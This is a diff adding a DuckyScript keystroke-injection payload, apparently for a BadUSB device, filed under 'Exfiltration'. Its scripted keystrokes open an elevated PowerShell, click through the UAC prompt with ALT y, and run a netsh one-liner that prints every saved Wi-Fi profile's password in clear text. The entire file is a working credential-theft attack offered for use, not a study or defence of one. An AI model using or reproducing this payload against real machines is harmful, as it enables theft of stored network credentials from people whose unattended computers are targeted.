@@ -1,0 +1,22 @@
+REM Author: Fastiraz
+REM Description: Extracts WiFi passwords with a payload of 339 characters.
+REM Version:	1.0
+REM Category:	Exfiltration
+DELAY 750
+WINDOWS d
+DELAY 1500
+WINDOWS r
+DELAY 1500
+STRING powershell
+CTRL SHIFT ENTER
+DELAY 750
+LEFTARROW
+DELAY 1100
+ENTER
+DELAY 1200
+ALT y
+DELAY 1300
+GUI UP
+DELAY 1400
+STRING (netsh wlan show profile) -split "`r`n"|ForEach-Object{if($_ -match "All User Profile\s+:\s+(.+)"){$p=$matches[1];Write-Host "Wi-Fi Profile: $p";$o=netsh wlan show profile $p key=clear;$l=$o|Select-String -Pattern "Key Content\s+:\s+(.+)";if($l){Write-Host "Password: $($l.Matches.Groups[1].Value)"}else{Write-Host "Password not found."}}}
+ENTER
